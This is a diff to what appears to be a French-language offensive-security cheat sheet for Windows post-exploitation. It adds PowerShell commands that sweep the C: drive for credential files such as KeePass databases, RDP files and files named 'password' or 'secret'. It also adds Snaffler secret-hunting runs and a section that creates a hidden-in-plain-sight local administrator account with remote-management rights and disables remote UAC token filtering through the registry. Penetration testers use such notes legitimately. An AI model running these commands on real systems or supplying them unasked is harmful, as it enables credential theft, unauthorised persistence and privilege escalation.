@@ -114,6 +114,12 @@ dir /s /b /a C:\*.kdbx 2>nul
 dir /s /b /a C:\*.settings 2>nul
 
 dir /s /b /a C:\Users\*.ini 2>nul
+
+# Par extension
+Get-ChildItem -Path C:\ -File -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Extension -match '\.(rdp|rdg|kdbx|settings)$' }
+
+# Par nom
+Get-ChildItem -Path C:\ -File -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Name -match 'password|credential|cred|secret|login' }
 ```
 
 **Lire un fichier**
@@ -765,5 +771,16 @@ https://github.com/jsdlm/SnafflerParser
 ```bash
 wget https://github.com/SnaffCon/Snaffler/releases/download/1.0.244/Snaffler.exe
 .\Snaffler.exe -o snafflerout.txt -s -y
-.\snafflerparser.ps1 -in my_snaffler_output.txt
+.\Snaffler.exe -o snafflerout.txt -s -y -i C:\
+.\snafflerparser.ps1 -in snafflerout.txt
+```
+
+## Create Admin Account + Bypass UAC
+
+```
+net user johndoe Password123! /add
+net localgroup administrators johndoe /add
+net localgroup "Remote Management Users" johndoe /add
+
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
 ```
